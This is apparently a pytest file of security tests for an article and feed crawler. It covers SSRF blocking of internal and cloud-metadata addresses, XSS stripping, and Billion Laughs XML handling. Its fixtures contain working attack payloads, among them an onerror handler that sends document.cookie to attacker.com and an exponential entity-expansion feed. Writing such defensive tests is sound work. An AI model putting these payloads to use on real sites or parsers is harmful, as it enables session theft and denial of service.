import pytest
from unittest.mock import patch, AsyncMock, MagicMock
from app.crawlers.article_crawler import (
    extract_clean_article_content,
    fetch_rss_feed,
    fetch_json_feed,
)
from app.crawlers.feed_discoverer import discover_feed_url
from app.crawlers.url_guard import UnsafeURLError, ensure_public_url


@pytest.mark.asyncio
async def test_ssrf_detector_blocks_internal_and_cloud_metadata(ssrf_target_urls):
    """
    Red Team test: Ensure internal IPs, loopback, and cloud metadata (169.254.169.254) are rejected
    by the guard the crawler's HTTP clients actually run on every request and redirect hop
    """
    for bad_url in ssrf_target_urls:
        with pytest.raises(UnsafeURLError):
            await ensure_public_url(bad_url)


@pytest.mark.asyncio
async def test_crawler_fetches_do_not_reach_internal_addresses(ssrf_target_urls):
    """The crawler entry points must refuse internal targets before any request leaves."""
    for bad_url in ssrf_target_urls:
        assert await extract_clean_article_content(bad_url) == ""
        with pytest.raises(UnsafeURLError):
            await fetch_rss_feed(bad_url)


def test_stored_xss_sanitization_in_article_content():
    """
    Red Team test: Ingest article HTML packed with XSS payloads:
    <script>, onerror triggers, SVG exploits, iframe injections.
    Ensure plain text extraction via BeautifulSoup or trafilatura strips executable tags.
    """
    from bs4 import BeautifulSoup

    malicious_html = """
    <html>
      <head><title>Technical Post</title></head>
      <body>
        <h1>Architecture of Distributed Queues</h1>
        <script>alert('XSS Exploit Injected!');</script>
        <p>This is genuine text discussing queuing models.</p>
        <img src="fake.jpg" onerror="fetch('http://attacker.com/steal?c='+document.cookie)" />
        <svg onload="alert(document.domain)"></svg>
        <iframe src="javascript:alert(1)"></iframe>
      </body>
    </html>
    """
    
    soup = BeautifulSoup(malicious_html, "html.parser")
    for s in soup(["script", "style", "iframe", "svg"]):
        s.decompose()
    clean_text = soup.get_text()

    assert "<script>" not in clean_text
    assert "alert('XSS Exploit Injected!')" not in clean_text
    assert "<iframe>" not in clean_text
    assert "Architecture of Distributed Queues" in clean_text
    assert "This is genuine text discussing queuing models" in clean_text


@pytest.mark.asyncio
async def test_xxe_and_billion_laughs_xml_handling():
    """
    Red Team test: Test crawler resistance against XML Entity Expansion (Billion Laughs / XXE).
    feedparser should parse securely or fail gracefully without infinite entity expansion or crashing.
    """
    billion_laughs_xml = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ELEMENT lolz (#PCDATA)>
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <rss version="2.0">
      <channel>
        <title>Attack Feed</title>
        <link>http://attack.org</link>
        <description>&lol3;</description>
        <item>
          <title>Payload Test</title>
          <link>http://attack.org/1</link>
          <description>&lol3;</description>
        </item>
      </channel>
    </rss>
    """
    mock_resp = AsyncMock()
    mock_resp.text = billion_laughs_xml
    mock_resp.raise_for_status = MagicMock()

    with patch("httpx.AsyncClient.get", return_value=mock_resp):
        try:
            items = await fetch_rss_feed("http://fake-attack-url.com/feed.xml")
            # If parsed, it should not have expanded uncontrollably
            assert isinstance(items, list)
        except Exception as e:
            # Rejection or parsing error is a valid, secure outcome
            assert isinstance(e, Exception)
